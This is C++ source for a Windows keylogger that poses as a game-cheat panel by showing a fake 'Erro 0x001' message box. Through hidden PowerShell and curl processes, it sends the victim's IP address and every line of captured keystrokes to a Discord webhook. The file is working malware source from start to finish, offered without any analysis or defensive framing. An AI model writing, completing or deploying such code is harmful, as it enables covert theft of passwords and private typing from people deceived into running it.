#include <iostream>
#include <windows.h>
#include <cstdlib>
#include <processthreadsapi.h>
using namespace std;
string lista = "";
string webHookDiscord = "SEU WEBHOOK";


void getIPsendDiscord(){
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    string comando = "powershell -Command \"$ip = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]; "
                        "$body = @{ username = 'KILL IP (' + $ip + ')'; content = 'User New --> KILL' } | ConvertTo-Json; "
                        "Invoke-RestMethod -Uri '" + webHookDiscord + "' -Method Post -Body $body -ContentType 'application/json'\"";
    
    CreateProcess(NULL,(char*)comando.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

LRESULT CALLBACK keyloggerKill(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyStruct->vkCode;
        BYTE keyboardState[256];
        WCHAR buffer[5];
        
        GetKeyboardState(keyboardState);
        keyboardState[VK_SHIFT] = GetAsyncKeyState(VK_SHIFT) & 0x8000 ? 0x80 : 0;
        keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 1 ? 1 : 0;
        int result = ToUnicode(vkCode, pKeyStruct->scanCode, keyboardState, buffer, 4, 0);
        
        if (result > 0) {
            buffer[result] = L'\0';
            char caractere = (char)buffer[0];
            
            if (caractere >= 32) { 
                lista += caractere;
            }
            
            if (vkCode == 13){
                STARTUPINFO si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                string commandOS = "curl -H \"Content-Type: application/json\" -X POST -d \"{\\\"username\\\":\\\"KILL\\\",\\\"content\\\":\\\"" + lista + "\\\"}\" " + webHookDiscord;
                CreateProcess(NULL,(char*)commandOS.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                lista = "";
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    MessageBoxA(NULL,"Erro 0x001","Painel Cheats",MB_ICONERROR);
    getIPsendDiscord();

    HHOOK bypass = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerKill, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(bypass);
    return 0;
}